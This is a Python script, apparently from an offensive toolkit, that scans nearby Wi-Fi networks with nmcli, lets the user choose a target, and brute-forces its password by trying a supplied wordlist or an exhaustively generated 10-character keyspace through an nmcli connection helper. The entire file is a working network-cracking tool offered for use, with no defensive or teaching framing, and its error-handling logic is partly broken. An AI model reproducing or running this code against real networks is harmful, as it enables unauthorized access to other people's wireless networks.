import itertools
import os
import subprocess

from mod.system.exploit_system.ncmli_wifi import nmcli


def wifi_scanner():
    print("[+] time (seconds): 10+ ")
    print("[+] scanning for wifi...")
    command = "nmcli dev wifi"
    res = subprocess.run(command, shell=True, capture_output=True, text=True)
    n = res.stdout
    n = str(n)
    n = n.split("\n")
    x = 0
    for g in n:
            if "IN-USE" in g or "--" in g or "*" in g:
                pass
            else:
                print(str(x) + ") "+g)
                #'''
                #        '''
            x = x + 1
    num = int(input("[+] enter the num of the wifi: "))

    os.system("clear")

    g = n[num]

    l = g
    l = l.split("  ")

    ssid_pre = l[5]
    ssid = ssid_pre

    mac_pre = l[4]
    mac = mac_pre

    ch_pre = l[13]
    ch = ch_pre
    
    return ssid, mac, ch


def atk():
    ssid, mac, ch = wifi_scanner()

    valid = False
    while not valid:
        word = input("[+] enter path to wordlis of use 'py' for pybrute for built in wordlist: ")
        if word != "py":
            try:
                words = open(word, "r").readlines()
                word_num = len(words)
                py = False
                valid = True
                
            except FileNotFoundError:
                print("[!] file ("+word+") not found!")

        else:
            print("[+] preping word list for attack")
            words = itertools.product("qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM", repeat=10)
            word_num = "TOO MANY DUE TO PYBRUTE"
            py = True 
            valid = True


    iface = input("[+] enter network card name (EG: wlan0 or wlan1): ")

    print("[+] target mac                   [  "+mac+"  ] ")
    print("[+] target channel               [  "+ch+"  ]  ")
    print("[+] using infterface             [  "+iface+"  ]")
    print("[+] words in word list           [  "+str(word_num)+"  ]")

    print("[+] attacking with nmcli...")
    c = 0
    false_count = 0
    for word in words:
        c = c + 1
        print("[+] count("+str(c)+")")
        if py == True:
                pas = str(word)
                pas = str(pas)
                pas = pas.replace("')","")
                pas = pas.replace("('","")
                pas = pas.replace("'","")
                pas = pas.replace(" ","")
                word = pas
        else:
                pass
        check = nmcli(ssid, word, iface)
        if check == "ssid err":
                false_count += 1
        elif false_count > 3:
            print("[!] too many error, stopping...")
            break
        elif check == "ssid err" and mac == "None":
                print("[!] wifi it isn't reachable")
                quit()
        elif check == "iface err":
            break
        elif check == "got":
            break
        else:
                pass


